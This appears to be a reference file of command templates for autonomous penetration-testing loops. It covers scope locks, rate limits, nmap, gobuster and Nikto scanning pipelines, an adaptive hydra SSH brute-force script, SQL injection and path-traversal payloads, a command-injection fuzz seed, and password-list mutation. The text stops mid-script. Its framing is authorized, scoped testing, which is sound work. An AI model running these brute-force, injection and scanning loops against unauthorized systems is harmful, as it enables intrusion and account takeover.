# Autonomous Loops — Payloads & Commands

> Companion to `SKILL.md`. Contains command templates, configuration templates, and operational payloads organized by loop pattern. For structured test scenarios, see `test-cases.md`. For the deep-dive guide on safe autonomous operations, see `guides/safe-autonomous-pentest.md`.

---

## Index

1. [Scope Lock Templates](#1-scope-lock-templates)
2. [Rate Limiting Configurations](#2-rate-limiting-configurations)
3. [Sequential Pipeline Commands](#3-sequential-pipeline-commands)
4. [Watch Loop Commands](#4-watch-loop-commands)
5. [Batch Processing Commands](#5-batch-processing-commands)
6. [Learning Cycle Commands](#6-learning-cycle-commands)
7. [State Machine Implementations](#7-state-machine-implementations)
8. [Checkpoint and Recovery](#8-checkpoint-and-recovery)
9. [Nested Loop Orchestration](#9-nested-loop-orchestration)
10. [Progress Tracking and Reporting](#10-progress-tracking-and-reporting)
11. [Timeout and Resource Management](#11-timeout-and-resource-management)
12. [Error Handling Response Templates](#12-error-handling-response-templates)
13. [Evidence Log Templates](#13-evidence-log-templates)

---

## 1. Scope Lock Templates

### Scope Lock: Sequential Pipeline

```markdown
## Scope Lock: Subnet Enumeration Pipeline
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Sequential Pipeline
- **Allowed targets**: 192.168.1.0/24 (254 hosts, .1 router excluded)
- **Allowed operations**: nmap SYN scan, banner grabbing, service version detection
- **Forbidden operations**: Exploit attempts, credential brute force, DoS techniques
- **Time limit**: 120 minutes wall-clock
- **Iteration limit**: 254 hosts maximum
- **Abort conditions**: IDS alert detected, target crash, scope deviation, operator manual stop
- **Operator notification**: Every 50 hosts or 15 minutes
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Watch Loop

```markdown
## Scope Lock: Service Availability Monitor
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Watch Loop
- **Allowed targets**: 192.168.1.100:80, 192.168.1.100:443, 192.168.1.100:22
- **Allowed operations**: TCP connect check, HTTP HEAD request, banner grab
- **Forbidden operations**: Vulnerability scanning, exploitation, modification of any service
- **Time limit**: 60 minutes wall-clock
- **Iteration limit**: 720 iterations (5-second polling interval)
- **Polling interval**: 5 seconds minimum
- **Abort conditions**: Target unreachable for 3 consecutive polls, operator manual stop
- **Trigger condition**: New service detected on any non-monitored port, or service state change
- **Operator notification**: On trigger event, every 100 iterations, on abort
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Batch Processing

```markdown
## Scope Lock: Mass Vulnerability Scan
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Batch Processing
- **Allowed targets**: targets.txt (pre-verified list, 50 hosts maximum)
- **Allowed operations**: nmap version scan, nikto web scan, SSL certificate check
- **Forbidden operations**: Active exploitation, denial of service, credential attacks
- **Time limit**: 180 minutes wall-clock
- **Iteration limit**: 50 hosts in batches of 5
- **Concurrency**: Maximum 5 simultaneous operations
- **Rate limit**: 2-second delay between batches
- **Abort conditions**: IDS alert, target crash, unexpected service disruption, operator manual stop
- **Operator notification**: Every 10 hosts completed, on any error, on completion
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

### Scope Lock: Learning Cycle

```markdown
## Scope Lock: Adaptive SQL Injection Testing
- **Operation ID**: OP-AL-{timestamp}
- **Loop pattern**: Learning Cycle
- **Allowed targets**: http://target.example.com/search?q= (single endpoint)
- **Allowed operations**: HTTP GET/POST with SQLi payloads, response analysis
- **Forbidden operations**: Modification of database content, admin access attempts, lateral movement
- **Time limit**: 30 minutes wall-clock
- **Iteration limit**: 50 payload variations maximum
- **Confidence threshold**: Abort if confidence < 10% after 10 attempts
- **Abort conditions**: WAF ban detected (HTTP 403/429), target error 500, operator manual stop
- **Refinement scope**: Payload variations only — NEVER widen target scope
- **Operator notification**: Every 10 iterations, on confidence threshold breach, on success
- **Evidence output**: /evidence/OP-AL-{timestamp}/
```

---

## 2. Rate Limiting Configurations

### Per-Operation Rate Profiles

```yaml
# Copy-paste rate limiting configuration for autonomous loops

network_scan:
  tool: nmap
  min_interval: "2s between hosts"
  max_concurrency: 5
  batch_delay: "3s between batches"
  retry_on_failure: true
  max_retries: 1
  backoff_multiplier: 2

web_request:
  tool: curl/httpx/nikto
  min_interval: "100ms between requests per target"
  max_concurrency: 3
  batch_delay: "1s between batches"
  retry_on_failure: false
  respect_retry_after: true
  backoff_multiplier: 2

dns_lookup:
  tool: dig/host/dnsrecon
  min_interval: "50ms between queries"
  max_concurrency: 10
  batch_delay: "500ms between batches"
  retry_on_failure: true
  max_retries: 2
  backoff_multiplier: 1.5

brute_force:
  tool: hydra/medusa
  min_interval: "500ms between attempts"
  max_concurrency: 1
  batch_delay: "1s between batches"
  retry_on_failure: false
  lockout_detection: true
  backoff_multiplier: 3

exploit_attempt:
  tool: msf/manual
  min_interval: "5s between attempts"
  max_concurrency: 1
  batch_delay: "10s between batches"
  retry_on_failure: false
  require_manual_approval: true
  backoff_multiplier: 5
```

### Adaptive Rate Limit Override

```bash
# When rate limit is detected, apply adaptive backoff
# Usage: ./rate_backoff.sh <base_delay> <multiplier> <max_delay>

BASE_DELAY=${1:-2}
MULTIPLIER=${2:-2}
MAX_DELAY=${3:-60}
CURRENT_DELAY=$BASE_DELAY

adaptive_wait() {
  echo "[RATE-LIMIT] Backing off: ${CURRENT_DELAY}s"
  sleep "$CURRENT_DELAY"
  CURRENT_DELAY=$((CURRENT_DELAY * MULTIPLIER))
  if [ "$CURRENT_DELAY" -gt "$MAX_DELAY" ]; then
    CURRENT_DELAY=$MAX_DELAY
  fi
}

reset_delay() {
  CURRENT_DELAY=$BASE_DELAY
}
```

---

## 3. Sequential Pipeline Commands

### Target List Processing

```bash
# Process a list of targets sequentially with scope check
# Scope: Read target list, validate against scope lock, execute one at a time

TARGET_LIST="targets.txt"
SCOPE_CIDR="192.168.1.0/24"
LOG_FILE="evidence/pipeline-$(date +%Y%m%d-%H%M%S).log"

mkdir -p evidence/

while IFS= read -r target; do
  # Scope check: verify target is within allowed range
  if prips "$SCOPE_CIDR" | grep -q "^${target}$"; then
    echo "[$(date -Iseconds)] [IN-SCOPE] $target" | tee -a "$LOG_FILE"
    # -- execute operation here --
  else
    echo "[$(date -Iseconds)] [OUT-OF-SCOPE] $target — SKIPPED" | tee -a "$LOG_FILE"
    continue
  fi
  # Rate limit
  sleep 2
done < "$TARGET_LIST"
```

### Port Scan Pipeline

```bash
# Sequential port scan across subnet — one host at a time
# Rate: 2s between hosts, max 254 targets

SUBNET="192.168.1.0/24"
OUTPUT_DIR="evidence/portscan-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo "[PIPELINE-START] Port scan pipeline: $SUBNET at $(date -Iseconds)"

for host in $(nmap -sn -n "$SUBNET" -oG - | awk '/Up$/{print $2}'); do
  echo "[ITERATION] Scanning $host"
  nmap -sV -T4 -p- --version-intensity 5 -oA "$OUTPUT_DIR/host-${host}" "$host" 2>&1 | tee -a "$OUTPUT_DIR/pipeline.log"

  # Rate limit between hosts
  sleep 2
done

echo "[PIPELINE-END] Completed at $(date -Iseconds)"
```

### Web Directory Enumeration Pipeline

```bash
# Sequential directory enumeration across multiple web targets
# Rate: 100ms between requests per target, 3s between targets

TARGETS=("http://target1.local" "http://target2.local" "http://target3.local")
WORDLIST="/usr/share/seclists/Discovery/Web-Content/common.txt"
OUTPUT_DIR="evidence/webdir-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

for target in "${TARGETS[@]}"; do
  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9]|-|g')
  echo "[ITERATION] Enumerating $target"

  gobuster dir -u "$target" -w "$WORDLIST" -t 3 -q 2>&1 \
    | tee "$OUTPUT_DIR/dir-${SAFE_NAME}.txt"

  # Rate limit between targets
  sleep 3
done
```

### Service Enumeration Pipeline

```bash
# Sequential service enumeration from nmap results
# Parse XML output, enumerate each discovered service

NMAP_XML="evidence/portscan-hosts.xml"
OUTPUT_DIR="evidence/service-enum-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

# Extract open ports and services
hosts_ports=$(nmap_parser.py "$NMAP_XML" --format "host:port:service" 2>/dev/null || \
  xmlstarlet sel -T -t -m "//host/address[@addrtype='ipv4']" -v "@addr" -o ":" \
    -m "../ports/port[state/@state='open']" -v "@portid" -o ":" -v "service/@name" -n "$NMAP_XML")

echo "$hosts_ports" | while IFS=: read -r host port service; do
  [ -z "$host" ] && continue
  echo "[ITERATION] Enumerating $service on $host:$port"

  case "$service" in
    http|https)
      nikto -h "http://${host}:${port}" -output "$OUTPUT_DIR/nikto-${host}-${port}.xml" 2>&1 | tail -5
      ;;
    smb|microsoft-ds)
      enum4linux -a "$host" > "$OUTPUT_DIR/smb-${host}.txt" 2>&1
      ;;
    ssh)
      ssh-audit "$host" > "$OUTPUT_DIR/ssh-${host}.txt" 2>&1
      ;;
    *)
      echo "[SKIP] No enumerator for service: $service"
      ;;
  esac

  sleep 2
done
```

---

## 4. Watch Loop Commands

### Service Monitoring

```bash
# Watch a set of ports for state changes (open/closed/filtered)
# Polling: 5s minimum interval, max 1000 iterations

TARGET="192.168.1.100"
PORTS=(22 80 443 3306 8080)
MAX_ITER=1000
POLL_INTERVAL=5
BASELINE_FILE="evidence/baseline-ports.txt"
ITER=0

echo "[WATCH-START] Monitoring $TARGET ports: ${PORTS[*]}"

# Capture baseline
for port in "${PORTS[@]}"; do
  timeout 3 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "$port:OPEN" || echo "$port:CLOSED"
done > "$BASELINE_FILE"

while [ "$ITER" -lt "$MAX_ITER" ]; do
  ITER=$((ITER + 1))
  for port in "${PORTS[@]}"; do
    current_state=$(timeout 3 bash -c "echo >/dev/tcp/$TARGET/$port" 2>/dev/null && echo "OPEN" || echo "CLOSED")
    baseline_state=$(grep "^${port}:" "$BASELINE_FILE" | cut -d: -f2)

    if [ "$current_state" != "$baseline_state" ]; then
      echo "[$(date -Iseconds)] [TRIGGER] Port $port changed: $baseline_state -> $current_state"
      echo "$port:$current_state" >> "evidence/watch-events-$(date +%Y%m%d).log"
      # Update baseline
      sed -i "s/^${port}:.*/${port}:${current_state}/" "$BASELINE_FILE"
    fi
  done

  sleep "$POLL_INTERVAL"
done

echo "[WATCH-END] Max iterations reached after $ITER cycles"
```

### Port Change Detection

```bash
# Monitor for new open ports using nmap diff
# Polling: 10s interval, max 500 iterations

TARGET="192.168.1.100"
PREV_SCAN=""

for i in $(seq 1 500); do
  CURRENT_SCAN=$(nmap -T4 -F -n "$TARGET" 2>/dev/null | grep "^[0-9]" | sort)

  if [ -n "$PREV_SCAN" ] && [ "$CURRENT_SCAN" != "$PREV_SCAN" ]; then
    echo "[$(date -Iseconds)] [CHANGE-DETECTED] Port scan diff:"
    diff <(echo "$PREV_SCAN") <(echo "$CURRENT_SCAN") | tee -a "evidence/port-diff-$(date +%Y%m%d).log"
  fi

  PREV_SCAN="$CURRENT_SCAN"
  sleep 10
done
```

### Log Watching

```bash
# Watch a web server log for specific patterns
# Trigger: new 200 response on admin endpoint

LOG_FILE="/var/log/apache2/access.log"
PATTERN="admin.*HTTP.*200"
LAST_LINE=0
MAX_ITER=1000
POLL_INTERVAL=5

for i in $(seq 1 "$MAX_ITER"); do
  CURRENT_LINES=$(wc -l < "$LOG_FILE")

  if [ "$CURRENT_LINES" -gt "$LAST_LINE" ]; then
    NEW_MATCHES=$(tail -n +"$((LAST_LINE + 1))" "$LOG_FILE" | grep -c "$PATTERN" || true)
    if [ "$NEW_MATCHES" -gt 0 ]; then
      echo "[$(date -Iseconds)] [TRIGGER] $NEW_MATCHES new matches for pattern: $PATTERN"
      tail -n +"$((LAST_LINE + 1))" "$LOG_FILE" | grep "$PATTERN" | tee -a "evidence/logwatch-$(date +%Y%m%d).log"
    fi
  fi

  LAST_LINE=$CURRENT_LINES
  sleep "$POLL_INTERVAL"
done
```

### New Endpoint Detection

```bash
# Periodically check for new web endpoints using HTTP response diff
# Trigger: new HTTP 200 response on previously unknown path

TARGET="http://target.local"
PATHS=("/admin" "/backup" "/api" "/console" "/debug" "/test" "/.env")
PREV_RESULTS=""
MAX_ITER=500
POLL_INTERVAL=10

for i in $(seq 1 "$MAX_ITER"); do
  CURRENT_RESULTS=""
  for path in "${PATHS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${path}" 2>/dev/null || echo "000")
    CURRENT_RESULTS="${CURRENT_RESULTS}${path}:${STATUS}\n"
  done

  if [ -n "$PREV_RESULTS" ] && [ "$CURRENT_RESULTS" != "$PREV_RESULTS" ]; then
    echo "[$(date -Iseconds)] [TRIGGER] Endpoint status change detected"
    diff <(echo -e "$PREV_RESULTS") <(echo -e "$CURRENT_RESULTS") | tee -a "evidence/endpoint-watch-$(date +%Y%m%d).log"
  fi

  PREV_RESULTS="$CURRENT_RESULTS"
  sleep "$POLL_INTERVAL"
done
```

---

## 5. Batch Processing Commands

### Mass DNS Lookup

```bash
# Batch DNS lookup with concurrency limit of 10
# Rate: 50ms between queries within batch, 500ms between batches

DOMAINS_FILE="domains.txt"
OUTPUT_FILE="evidence/dns-batch-$(date +%Y%m%d-%H%M%S).txt"
BATCH_SIZE=10
BATCH_DELAY=0.5

echo "[BATCH-START] DNS lookup: $DOMAINS_FILE at $(date -Iseconds)"

TOTAL=$(wc -l < "$DOMAINS_FILE")
PROCESSED=0

while IFS= read -r domain; do
  dig +short "$domain" A &
  dig +short "$domain" MX &
  dig +short "$domain" TXT &

  PROCESSED=$((PROCESSED + 1))

  if [ $((PROCESSED % BATCH_SIZE)) -eq 0 ]; then
    wait
    echo "[BATCH] Processed $PROCESSED / $TOTAL domains"
    sleep "$BATCH_DELAY"
  fi
done < "$DOMAINS_FILE"

wait
echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch HTTP Header Check

```bash
# Batch security header analysis with concurrency limit of 3
# Rate: 100ms between requests, 1s between batches

TARGETS_FILE="urls.txt"
OUTPUT_DIR="evidence/headers-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=3
BATCH_DELAY=1

echo "[BATCH-START] HTTP header analysis at $(date -Iseconds)"

httpx -l "$TARGETS_FILE" -status-code -content-length -title \
  -tech-detect -follow-redirects -threads "$CONCURRENCY" \
  -o "$OUTPUT_DIR/httpx-results.txt"

# Security header analysis per target
while IFS= read -r url; do
  SAFE_NAME=$(echo "$url" | sed 's|[^a-zA-Z0-9]|-|g')
  curl -sI "$url" > "$OUTPUT_DIR/headers-${SAFE_NAME}.txt"
  sleep 0.1
done < "$TARGETS_FILE"

echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch Vulnerability Scan

```bash
# Batch vulnerability scan using nmap vuln category scripts
# Concurrency: 5 hosts at a time, 3s between batches

TARGETS_FILE="targets.txt"
OUTPUT_DIR="evidence/vulnscan-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=5
BATCH_DELAY=3

echo "[BATCH-START] Vulnerability scan at $(date -Iseconds)"

# Split targets into batches
split -l "$CONCURRENCY" "$TARGETS_FILE" "$OUTPUT_DIR/batch-"

BATCH_NUM=0
for batch_file in "$OUTPUT_DIR"/batch-*; do
  BATCH_NUM=$((BATCH_NUM + 1))
  echo "[BATCH] Running batch $BATCH_NUM"

  while IFS= read -r target; do
    nmap --script vuln -T4 -sV -oA "$OUTPUT_DIR/vuln-${target}" "$target" &
  done < "$batch_file"

  wait
  sleep "$BATCH_DELAY"
done

# Clean up batch files
rm -f "$OUTPUT_DIR"/batch-*

echo "[BATCH-END] Completed at $(date -Iseconds)"
```

### Batch Nikto Scan

```bash
# Batch Nikto web vulnerability scan with concurrency limit of 3
# Rate: 2s between scans

TARGETS_FILE="web_targets.txt"
OUTPUT_DIR="evidence/nikto-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
CONCURRENCY=3
BATCH_DELAY=2
COUNT=0

echo "[BATCH-START] Nikto scan at $(date -Iseconds)"

while IFS= read -r target; do
  COUNT=$((COUNT + 1))
  SAFE_NAME=$(echo "$target" | sed 's|[^a-zA-Z0-9]|-|g')
  nikto -h "$target" -o "$OUTPUT_DIR/nikto-${SAFE_NAME}.xml" -Format xml &
  sleep 0.5

  if [ $((COUNT % CONCURRENCY)) -eq 0 ]; then
    wait
    echo "[BATCH] Completed $COUNT targets"
    sleep "$BATCH_DELAY"
  fi
done < "$TARGETS_FILE"

wait
echo "[BATCH-END] $COUNT targets scanned at $(date -Iseconds)"
```

---

## 6. Learning Cycle Commands

### Adaptive Brute Force

```bash
# Adaptive SSH brute force with wordlist refinement
# Max 50 iterations, confidence threshold 10% after 10 attempts

TARGET="192.168.1.100"
USER_LIST="users.txt"
BASE_WORDLIST="passwords-base.txt"
MUTATED_WORDLIST="passwords-mutated.txt"
LOG_FILE="evidence/adaptive-bruteforce-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50
CONFIDENCE_THRESHOLD=0.1
MIN_DATA_ITER=10

ITER=0
ATTEMPTS=0
SUCCESSES=0

# Phase 1: Base wordlist
echo "[LEARN-START] Phase 1: Base wordlist at $(date -Iseconds)"
while IFS= read -r user; do
  while IFS= read -r pass; do
    ITER=$((ITER + 1))
    ATTEMPTS=$((ATTEMPTS + 1))

    result=$(hydra -l "$user" -p "$pass" -t 1 -W 1 ssh://"$TARGET" 2>&1)
    echo "[$(date -Iseconds)] [ITER-$ITER] $user:$pass -> $(echo "$result" | tail -1)" | tee -a "$LOG_FILE"

    if echo "$result" | grep -q "login:"; then
      SUCCESSES=$((SUCCESSES + 1))
      echo "[$(date -Iseconds)] [SUCCESS] $user:$pass" | tee -a "$LOG_FILE"
    fi

    if [ "$ITER" -ge "$MAX_ITER" ]; then
      echo "[LEARN-END] Max iterations reached" | tee -a "$LOG_FILE"
      exit 0
    fi

    sleep 0.5
  done < "$BASE_WORDLIST"
done < "$USER_LIST"

# Phase 2: Mutate wordlist based on results (if confidence too low)
CONFIDENCE=$(echo "scale=4; $SUCCESSES / $ATTEMPTS" | bc 2>/dev/null || echo "0")
if [ "$(echo "$CONFIDENCE < $CONFIDENCE_THRESHOLD" | bc 2>/dev/null)" -eq 1 ]; then
  echo "[LEARN] Confidence ($CONFIDENCE) below threshold. Mutating wordlist..." | tee -a "$LOG_FILE"
  # Generate mutations: capitalize, append numbers, leet speak
  while IFS= read -r word; do
    echo "$word"
    echo "${word}123"
    echo "${word}!"
    echo "$(echo "$word" | sed 's/a/4/g;s/e/3/g;s/i/1/g;s/o/0/g')"
    echo "$(echo "$word" | sed 's/.*/\u&/')"
  done < "$BASE_WORDLIST" > "$MUTATED_WORDLIST"
fi
```

### SQLi Payload Refinement

```bash
# Iterative SQLi payload testing with feedback-based refinement
# Max 50 iterations, abort on WAF detection

TARGET_URL="http://target.local/search?q="
BASE_PAYLOADS=(
  "'" "' OR 1=1--" "' OR '1'='1" "\" OR \"1\"=\"1"
  "1' UNION SELECT NULL--" "1' UNION SELECT NULL,NULL--"
)
LOG_FILE="evidence/sqli-refine-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50

ITER=0
for payload in "${BASE_PAYLOADS[@]}"; do
  ITER=$((ITER + 1))
  [ "$ITER" -gt "$MAX_ITER" ] && break

  response=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")" 2>/dev/null)
  body=$(curl -s "${TARGET_URL}$(python3 -c "import urllib.parse; print(urllib.parse.quote('${payload}'))")" 2>/dev/null | head -c 500)

  echo "[$(date -Iseconds)] [ITER-$ITER] Payload: ${payload} -> HTTP ${response}" | tee -a "$LOG_FILE"

  # WAF detection
  if [ "$response" = "403" ] || [ "$response" = "429" ]; then
    echo "[ABORT] WAF detected (HTTP $response). Stopping." | tee -a "$LOG_FILE"
    break
  fi

  # Success indicators
  if echo "$body" | grep -qiE "sql|mysql|syntax|error|query"; then
    echo "[LEARN] SQL error detected — refining payload for extraction" | tee -a "$LOG_FILE"
    # Next iteration would use refined payloads based on this feedback
  fi

  sleep 0.5
done
```

### Fuzzing with Feedback

```bash
# Fuzz an HTTP parameter with iterative payload generation
# Feedback loop: analyze response length and status to guide next payloads

TARGET="http://target.local/api/user"
PARAM="id"
LOG_FILE="evidence/fuzz-feedback-$(date +%Y%m%d-%H%M%S).log"
MAX_ITER=50

# Seed payloads
PAYLOADS=(1 2 3 100 -1 0 999999 "a" "'" "\"" "../../../etc/passwd" "$(sleep 5)")

ITER=0
BASELINE_LENGTH=""

for payload in "${PAYLOADS[@]}"; do
  ITER=$((ITER + 1))
  [ "$ITER" -gt "$MAX_ITER" ] && break

  response=$(curl -s -w "\n%{http_code} %{size_download}" "${TARGET}?${PARAM}=${payload}" 2>/dev/null)
  http_code=$(echo "$response" | tail -1 | awk '{print $1}')
  body_length=$(echo "$response" | tail -1 | awk '{print $2}')
  body=$(echo "$response" | sed '$d')

  if [ -z "$BASELINE_LENGTH" ]; then
    BASELINE_LENGTH=$body_length
  fi

  echo "[$(date -Iseconds)] [ITER-$ITER] ${PARAM}=${payload} -> HTTP ${http_code}, Length: ${body_length} (baseline: ${BASELINE_LENGTH})" | tee -a "$LOG_FILE"

  # Anomaly: response length significantly different from baseline
  if [ -n "$BASELINE_LENGTH" ] && [ "$body_length" != "$BASELINE_LENGTH" ]; then
    diff=$((body_length - BASELINE_LENGTH))
    if [ "${diff#-}" -gt 100 ]; then
      echo "[LEARN] Significant response deviation (${diff} bytes). Flagging for investigation." | tee -a "$LOG_FILE"
    fi
  fi

  sleep 0.1
done
```

### Password List Mutation

```bash
# Generate mutated password lists from base words using common transformation rules
# Used by Learning Cycle to expand search space after base list exhaustion

BASE_LIST="passwords-base.txt"
OUTPUT="passwords-mutated-$(date +%Y%m%d-%H%M%S).txt"

echo "[LEARN] Generating mutations from $BASE_LIST"

while IFS= read -r word; do
  # Original
  echo "$word"
  # Capitalize first letter
  echo "$word" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}'
  # All uppercase
  echo "$word" | tr '[:lower:]' '[:upper:]'
  # Append common suffixes
  for suffix in "!" "@123" "#1" "2024" "2025" "2026" "." "!!" "1234" "12345"; do
    echo "${word}${suffix}"
    echo "$(echo "$word" | awk '{print toupper(substr($0,1,1)) tolower(substr($0,2))}')${suffix}"
  done
  # Leet speak
  echo "$word" | sed 's/a/4/g;s/e/3/g;s/i/1/g;s/o/0/g;s/s/5/g;s/t/7/g'
  # Reverse
  echo "$word" | rev
  # Double
  echo "${word}${word}"
done < "$BASE_LIST" | sort -u > "$OUTPUT"

echo "[LEARN] Mutated list: $(wc -l < "$OUTPUT") unique entries saved to $OUTPUT"
```

---

## 7. State Machine Implementations

### Finite State Machine for Multi-Phase Operations

```python
#!/usr/bin/env python3
"""State machine for phased autonomous operations with explicit transitions."""

from enum import Enum, auto
from typing import Dict, Callable

class OpState(Enum):
    INIT = auto()
    RECON = auto()
    SCAN = auto()
    EXPLOIT = auto()
    REPORT = auto()
    DONE = auto()
    ERROR = auto()

class StateMachine:
    def __init__(self):
        self.state = OpState.INIT
        self.transitions: Dict[OpState, Dict[str, OpState]] = {
            OpState.INIT:    {"success": OpState.RECON, "error": OpState.ERROR},
            OpState.RECON:   {"success": OpState.SCAN, "error": OpState.ERROR},
            OpState.SCAN:    {"success": OpState.EXPLOIT, "partial": OpState.SCAN, "error": OpState.ERROR},
            OpState.EXPLOIT: {"success": OpState.REPORT, "error": OpState.REPORT},
            OpState.REPORT:  {"success": OpState.DONE, "error": OpState.ERROR},
        }
        self.handlers: Dict[OpState, Callable] = {}

    def register(self, state: OpState, handler: Callable):
        self.handlers[state] = handler

    def run(self, max_iterations=100):
        iteration = 0
        while self.state not in (OpState.DONE, OpState.ERROR) and iteration < max_iterations:
            iteration += 1
            handler = self.handlers.get(self.state)
            if not handler:
                self.state = OpState.ERROR
                break
            result = handler()
            next_state = self.transitions.get(self.state, {}).get(result, OpState.ERROR)
            print(f"[FSM] {self.state.name} -> {result} -> {next_state.name}")
            self.state = next_state
        print(f"[FSM] Final state: {self.state.name} after {iteration} iterations")
```

### Retry Logic with Exponential Backoff

```python
#!/usr/bin/env python3
"""Retry wrapper with configurable backoff for autonomous operations."""

import time
import subprocess
from dataclasses import dataclass

@dataclass
class RetryConfig:
    max_retries: int = 3
    base_delay: float = 2.0
    max_delay: float = 60.0
    backoff_multiplier: float = 2.0
    retry_on_exit_codes: tuple = (1, 2, 7, 28)  # common network/tool errors

def retry_command(cmd, config: RetryConfig) -> subprocess.CompletedProcess:
    delay = config.base_delay
    last_result = None

    for attempt in range(1, config.max_retries + 1):
        print(f"[RETRY] Attempt {attempt}/{config.max_retries}: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

        if result.returncode == 0:
            return result

        if result.returncode not in config.retry_on_exit_codes:
            print(f"[RETRY] Non-retryable exit code {result.returncode}, giving up")
            return result

        last_result = result
        print(f"[RETRY] Failed (exit {result.returncode}), waiting {delay}s before retry")
        time.sleep(delay)
        delay = min(delay * config.backoff_multiplier, config.max_delay)

    return last_result

# Usage: retry_command(["nmap", "-sV", "-p", "22,80", "target"], RetryConfig(max_retries=5))
```

### Convergence Detection for Learning Cycles

```python
#!/usr/bin/env python3
"""Detect when a learning cycle has converged (no improvement over N iterations)."""

from collections import deque

class ConvergenceDetector:
    def __init__(self, window_size=5, threshold=0.01):
        self.window = deque(maxlen=window_size)
        self.threshold = threshold
        self.best_score = float('-inf')
        self.iterations_without_improvement = 0

    def update(self, score: float) -> dict:
        self.window.append(score)
        improved = score > self.best_score + self.threshold

        if improved:
            self.best_score = score
            self.iterations_without_improvement = 0
        else:
            self.iterations_without_improvement += 1

        converged = (
            self.iterations_without_improvement >= self.window.maxlen
            and len(self.window) == self.window.maxlen
        )

        avg_delta = 0.0
        if len(self.window) >= 2:
            deltas = [abs(self.window[i] - self.window[i-1]) for i in range(1, len(self.window))]
            avg_delta = sum(deltas) / len(deltas)

        return {
            "converged": converged,
            "best_score": self.best_score,
            "iterations_without_improvement": self.iterations_without_improvement,
            "avg_delta": round(avg_delta, 6),
            "should_stop": converged or avg_delta < self.threshold
        }
```

---

## 8. Checkpoint and Recovery

### Checkpoint Save/Load for Long-Running Operations

```python
#!/usr/bin/env python3
"""Checkpoint system for resumable autonomous loop operations."""

import json
import os
from datetime import datetime

class CheckpointManager:
    def __init__(self, operation_id, checkpoint_dir="evidence/checkpoints"):
        self.operation_id = operation_id
        self.checkpoint_dir = os.path.join(checkpoint_dir, operation_id)
        os.makedirs(self.checkpoint_dir, exist_ok=True)
        self.checkpoint_file = os.path.join(self.checkpoint_dir, "state.json")

    def save(self, state: dict):
        state["saved_at"] = datetime.utcnow().isoformat()
        state["operation_id"] = self.operation_id
        with open(self.checkpoint_file, "w") as f:
            json.dump(state, f, indent=2, default=str)
        print(f"[CHECKPOINT] Saved at iteration {state.get('iteration', '?')}")

    def load(self) -> dict:
        if not os.path.exists(self.checkpoint_file):
            return None
        with open(self.checkpoint_file) as f:
            state = json.load(f)
        print(f"[CHECKPOINT] Resuming from iteration {state.get('iteration', '?')}")
        return state

    def is_resumable(self) -> bool:
        return os.path.exists(self.checkpoint_file)

# Usage:
# ckpt = CheckpointManager("OP-AL-20260531-001")
# state = ckpt.load() or {"iteration": 0, "targets_processed": []}
# ... do work ...
# ckpt.save({"iteration": i, "targets_processed": processed, "status": "in_progress"})
```

### Pipeline Resume from Checkpoint

```bash
#!/usr/bin/env bash
# Resume a port scan pipeline from the last checkpoint
# Usage: ./resume_scan.sh <checkpoint_file>

CHECKPOINT="${1:-evidence/checkpoints/OP-AL-latest/state.json}"
TARGETS_FILE="targets.txt"
OUTPUT_DIR="evidence/portscan-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"

if [ -f "$CHECKPOINT" ]; then
    LAST_HOST=$(python3 -c "import json; print(json.load(open('$CHECKPOINT'))['last_host'])")
    echo "[RESUME] Resuming from host: $LAST_HOST"
    # Skip already-processed hosts
    SKIP=true
else
    LAST_HOST=""
    SKIP=false
fi

while IFS= read -r host; do
    if [ "$SKIP" = true ]; then
        [ "$host" = "$LAST_HOST" ] && SKIP=false
        continue
    fi

    echo "[ITERATION] Scanning $host"
    nmap -sV -T4 -p- -oA "$OUTPUT_DIR/host-${host}" "$host" 2>&1 | tail -1

    # Save checkpoint after each host
    python3 -c "
import json
state = {'last_host': '$host', 'iteration': $(wc -l < "$OUTPUT_DIR"/*.nmap 2>/dev/null || echo 0)}
json.dump(state, open('evidence/checkpoints/OP-AL-latest/state.json','w'), indent=2)
"
    sleep 2
done < "$TARGETS_FILE"
```

---

## 9. Nested Loop Orchestration

### Multi-Level Target Processing

```bash
#!/usr/bin/env bash
# Nested loop: iterate subnets -> hosts -> ports with scope enforcement

SUBNETS=("192.168.1.0/24" "192.168.2.0/24")
TOP_PORTS="22,80,443,3306,5432,8080,8443"
OUTPUT_DIR="evidence/nested-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUTPUT_DIR"
MAX_HOSTS=254
MAX_SUBNETS=${#SUBNETS[@]}

for subnet_idx in "${!SUBNETS[@]}"; do
    subnet="${SUBNETS[$subnet_idx]}"
    echo "[OUTER] Subnet $((subnet_idx + 1))/$MAX_SUBNETS: $subnet"

    hosts=$(nmap -sn -n "$subnet" -oG - | awk '/Up$/{print $2}')
    host_count=0

    for host in $hosts; do
        host_count=$((host_count + 1))
        [ "$host_count" -gt "$MAX_HOSTS" ] && break

        echo "[INNER] Host $host_count: $host"
